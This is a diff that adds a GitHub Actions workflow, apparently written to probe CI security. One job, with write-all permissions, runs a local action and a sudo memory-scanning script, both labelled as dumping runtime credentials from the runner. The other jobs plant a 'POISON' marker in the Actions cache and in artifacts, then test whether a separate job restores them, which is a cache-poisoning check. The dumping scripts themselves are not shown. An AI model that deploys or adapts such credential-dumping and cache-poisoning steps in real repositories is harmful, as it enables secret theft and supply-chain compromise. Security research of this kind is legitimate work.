@@ -1,0 +1,57 @@
+name: i11100-cache
+on:
+  push:
+    branches: [ exp-11100 ]
+  workflow_dispatch:
+permissions: write-all
+jobs:
+  actdump:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: runtime cred dump (ACTION step - only place creds exist)
+        uses: ./i11100/act
+      - name: runtime cred dump (runner mem via sudo)
+        run: |
+          set +e
+          sudo python3 i11100/memscan.py 2>&1 | tail -80
+  write:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: seed payload
+        run: |
+          mkdir -p cachepayload
+          echo "POISON_FROM_EXP11100 run=${{ github.run_id }} attempt=${{ github.run_attempt }} $(date -u)" > cachepayload/marker.txt
+          cat cachepayload/marker.txt
+      - uses: actions/cache/save@v4
+        with:
+          key: i11100-poison
+          path: cachepayload
+      - name: upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: i11100-art
+          path: cachepayload/marker.txt
+  read:
+    needs: write
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: restore cache (own token, same branch, other job)
+        uses: actions/cache/restore@v4
+        with:
+          key: i11100-poison
+          path: cachepayload
+      - name: inspect restored cache
+        run: |
+          echo "SAME_BRANCH_JOB_RESTORED:"; cat cachepayload/marker.txt 2>/dev/null || echo "NOT_RESTORED"
+      - name: download artifact (own token, cross-job same run)
+        uses: actions/download-artifact@v4
+        continue-on-error: true
+        with:
+          name: i11100-art
+          path: dl
+      - name: inspect artifact
+        run: |
+          echo "SAME_RUN_CROSSJOB_ARTIFACT:"; cat dl/marker.txt 2>/dev/null || echo "NOT_AVAILABLE"
